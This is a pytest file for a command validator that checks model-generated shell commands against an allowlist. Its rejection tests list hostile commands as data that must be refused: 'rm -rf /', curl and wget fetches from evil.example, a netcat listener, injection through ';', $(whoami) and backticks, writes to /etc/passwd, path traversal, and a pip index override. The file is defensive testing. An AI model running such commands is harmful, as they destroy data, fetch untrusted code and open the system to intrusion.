"""Command validation: nothing reaches the runner straight from model output."""

from __future__ import annotations

import pytest

from reprolab.runner.commands import (
    CommandNotAllowed,
    CommandPhase,
    internal_command,
    parse_command,
    requires_network,
)


class TestRejections:
    @pytest.mark.parametrize(
        "command",
        [
            "rm -rf /",
            "curl https://evil.example/x.sh",
            "wget http://evil.example/payload",
            "bash setup.sh",
            "sh -c 'echo hi'",
            "make install",
            "chmod 777 /etc",
            "sudo pip install x",
            "nc -l 4444",
            "/usr/bin/python script.py",
        ],
    )
    def test_programs_outside_the_allowlist(self, command: str) -> None:
        with pytest.raises(CommandNotAllowed):
            parse_command(command, phase=CommandPhase.SETUP)

    @pytest.mark.parametrize(
        "command",
        [
            "pip install x && python run.py",
            "python a.py | tee out.txt",
            "python a.py; rm -rf /",
            "python a.py > /etc/passwd",
            "python $(whoami).py",
            "python `id`.py",
            "python a.py\nrm -rf /",
        ],
    )
    def test_shell_constructs(self, command: str) -> None:
        with pytest.raises(CommandNotAllowed, match="shell"):
            parse_command(command, phase=CommandPhase.SETUP)

    def test_inline_python_code_is_refused(self) -> None:
        # Passed as argv so the shell-metacharacter rule does not fire first:
        # `python -c` is refused on its own merits.
        with pytest.raises(CommandNotAllowed, match="inline code"):
            parse_command(
                ["python", "-c", "import os"], phase=CommandPhase.SETUP
            )

    def test_path_traversal_in_arguments(self) -> None:
        with pytest.raises(CommandNotAllowed, match=r"\.\."):
            parse_command("python ../../etc/evil.py", phase=CommandPhase.EXPERIMENT)

    def test_absolute_paths_outside_tmp(self) -> None:
        with pytest.raises(CommandNotAllowed, match="absolute"):
            parse_command("python /etc/evil.py", phase=CommandPhase.EXPERIMENT)

    def test_write_capable_git_subcommands(self) -> None:
        for command in ("git push origin main", "git clone https://x/y", "git fetch"):
            with pytest.raises(CommandNotAllowed, match="read-only"):
                parse_command(command, phase=CommandPhase.SETUP)

    def test_pip_index_overrides(self) -> None:
        with pytest.raises(CommandNotAllowed):
            parse_command(
                "pip install --index-url http://evil.example/simple x",
                phase=CommandPhase.SETUP,
            )

    def test_pip_uninstall_is_refused(self) -> None:
        with pytest.raises(CommandNotAllowed, match="pip subcommands"):
            parse_command("pip uninstall -y numpy", phase=CommandPhase.SETUP)

    def test_workdir_cannot_escape(self) -> None:
        with pytest.raises(CommandNotAllowed, match="workdir"):
            parse_command("python a.py", phase=CommandPhase.EXPERIMENT, workdir="../..")

    def test_empty_command(self) -> None:
        with pytest.raises(CommandNotAllowed):
            parse_command("   ", phase=CommandPhase.SETUP)

    def test_too_many_arguments(self) -> None:
        with pytest.raises(CommandNotAllowed, match="arguments"):
            parse_command(
                ["python"] + [f"a{i}.py" for i in range(100)],
                phase=CommandPhase.EXPERIMENT,
            )


class TestAcceptances:
    @pytest.mark.parametrize(
        "command",
        [
            "pip install .",
            "pip install -r requirements.txt",
            "pip install bm25s[core]",
            "pip list",
            "python -m pytest tests -q",
            "pytest tests/core/test_retrieve.py -q",
            "python examples/demo.py",
            "python -m mypackage.cli --sample 10",
            "git rev-parse HEAD",
            "ls -la",
            "cat README.md",
        ],
    )
    def test_documented_commands_pass(self, command: str) -> None:
        validated = parse_command(command, phase=CommandPhase.SETUP, purpose="docs")
        assert validated.argv[0] in {
            "pip", "python", "pytest", "git", "ls", "cat"
        }

    def test_phase_controls_network(self) -> None:
        setup = parse_command("pip install .", phase=CommandPhase.SETUP)
        experiment = parse_command("pytest -q", phase=CommandPhase.EXPERIMENT)
        assert requires_network(setup) is True
        assert requires_network(experiment) is False

    def test_display_round_trips(self) -> None:
        validated = parse_command("pytest tests -q", phase=CommandPhase.EXPERIMENT)
        assert validated.display == "pytest tests -q"
        assert validated.as_dict()["argv"] == ["pytest", "tests", "-q"]

    def test_internal_commands_bypass_the_allowlist_but_stay_recorded(self) -> None:
        # ReproLab's own bootstrap argv is a literal in our source, not model
        # output -- but it still runs in the same isolated container.
        command = internal_command(
            ["python", "-m", "venv", "/workspace/.venv"],
            phase=CommandPhase.SETUP,
            purpose="bootstrap",
        )
        assert command.argv == ("python", "-m", "venv", "/workspace/.venv")
        # The same argv from a model would be refused.
        with pytest.raises(CommandNotAllowed):
            parse_command("python -m venv /workspace/.venv", phase=CommandPhase.SETUP)
